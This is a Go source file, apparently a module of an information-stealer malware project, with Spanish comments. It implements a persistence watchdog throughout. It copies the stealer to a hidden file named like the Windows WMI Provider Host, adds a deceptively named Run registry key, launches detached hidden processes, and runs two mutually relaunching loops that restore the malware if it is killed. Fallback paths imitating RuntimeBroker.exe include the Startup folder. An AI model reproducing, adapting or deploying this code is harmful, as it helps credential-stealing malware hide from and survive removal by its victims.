package watchdog

// watchdog.go — lanza un proceso watchdog separado que vigila y relanza el stealer
// El watchdog se instala como "WmiPrvSE.exe" (mascarada como WMI Provider Host)
// Si el stealer muere → lo relanza. Si el watchdog muere → lo relanza el stealer. Loop eterno.

import (
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"syscall"
	"time"

	"github.com/aqua/stealer/utils/fileutil"
)

const watchdogName = "WmiPrvSE.exe"

// watchdogPayload es el código que el watchdog ejecuta (se inyecta como argumento codificado)
// El watchdog es el mismo binario ejecutado con arg especial "--wdog <pid> <target_path>"

const watchdogFlag = "--wdog"

// Run se llama desde main.go al inicio
// Si el proceso actual YA es el watchdog, RunAsWatchdog() maneja la lógica
// Si no, lanza el watchdog externo y también inicia el guardián interno
func Run() {
	args := os.Args
	// Si somos el watchdog, no lanzar otro watchdog
	for i, a := range args {
		if a == watchdogFlag && i+2 < len(args) {
			pid, _ := strconv.Atoi(args[i+1])
			target := args[i+2]
			runAsWatchdog(pid, target)
			return
		}
	}

	exe, err := os.Executable()
	if err != nil {
		return
	}

	// Instalar watchdog en ruta separada
	wdogDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "WMI")
	os.MkdirAll(wdogDir, os.ModePerm)
	wdogPath := filepath.Join(wdogDir, watchdogName)

	if !fileutil.Exists(wdogPath) {
		fileutil.CopyFile(exe, wdogPath)
	}
	exec.Command("attrib", "+h", "+s", wdogPath).Run()

	// Lanzar watchdog externo con PID actual + ruta del stealer
	pid := os.Getpid()
	cmd := exec.Command(wdogPath, watchdogFlag, strconv.Itoa(pid), exe)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP | 0x00000008, // DETACHED_PROCESS
	}
	cmd.Start()

	// Registrar watchdog en Run key también
	exec.Command("reg", "add",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "MicrosoftWMIHost",
		"/t", "REG_SZ",
		"/d", wdogPath+" "+watchdogFlag+" 0 "+exe,
		"/f").Run()

	// Watchdog interno: goroutine que relanza el watchdog si muere
	go internalGuard(wdogPath, exe)
}

// runAsWatchdog — lógica del proceso watchdog externo
func runAsWatchdog(parentPID int, targetPath string) {
	for {
		time.Sleep(10 * time.Second)

		// Verificar si el proceso padre sigue vivo
		alive := isProcessAlive(parentPID)
		if !alive {
			// Relanzar el stealer
			newPID := relaunch(targetPath)
			if newPID > 0 {
				parentPID = newPID
			}
		}

		// Verificar que la ruta del stealer existe
		if !fileutil.Exists(targetPath) {
			// Intentar encontrarlo en rutas alternativas
			alts := alternativePaths()
			for _, alt := range alts {
				if fileutil.Exists(alt) {
					targetPath = alt
					relaunch(targetPath)
					break
				}
			}
		}
	}
}

// internalGuard — guardián interno que relanza el watchdog externo si muere
func internalGuard(wdogPath, targetPath string) {
	for {
		time.Sleep(30 * time.Second)

		if !isWatchdogRunning(wdogPath) {
			if !fileutil.Exists(wdogPath) {
				exe, err := os.Executable()
				if err == nil {
					fileutil.CopyFile(exe, wdogPath)
					exec.Command("attrib", "+h", "+s", wdogPath).Run()
				}
			}
			pid := os.Getpid()
			cmd := exec.Command(wdogPath, watchdogFlag, strconv.Itoa(pid), targetPath)
			cmd.SysProcAttr = &syscall.SysProcAttr{
				HideWindow:    true,
				CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP | 0x00000008,
			}
			cmd.Start()
		}
	}
}

func relaunch(path string) int {
	cmd := exec.Command(path)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}
	if err := cmd.Start(); err == nil && cmd.Process != nil {
		return cmd.Process.Pid
	}
	return 0
}

func isProcessAlive(pid int) bool {
	if pid <= 0 {
		return false
	}
	h, err := syscall.OpenProcess(syscall.SYNCHRONIZE, false, uint32(pid))
	if err != nil {
		return false
	}
	defer syscall.CloseHandle(h)

	r, _ := syscall.WaitForSingleObject(h, 0)
	return r == syscall.WAIT_TIMEOUT // WAIT_TIMEOUT = proceso sigue vivo
}

func isWatchdogRunning(wdogPath string) bool {
	// Revisar si hay un proceso con ese nombre corriendo
	out, err := exec.Command("tasklist", "/fi",
		"imagename eq "+filepath.Base(wdogPath), "/fo", "csv", "/nh").Output()
	if err != nil {
		return false
	}
	return len(out) > 10 && string(out) != "INFO: No tasks are running which match the specified criteria.\r\n"
}

func alternativePaths() []string {
	appdata := os.Getenv("APPDATA")
	localappdata := os.Getenv("LOCALAPPDATA")
	temp := os.Getenv("TEMP")
	return []string{
		filepath.Join(appdata, "Microsoft", "Protect", "RuntimeBroker.exe"),
		filepath.Join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "RuntimeBroker.exe"),
		filepath.Join(localappdata, "Microsoft", "Windows", "INetCache", "RuntimeBroker.exe"),
		filepath.Join(temp, "RuntimeHostSvc.exe"),
	}
}
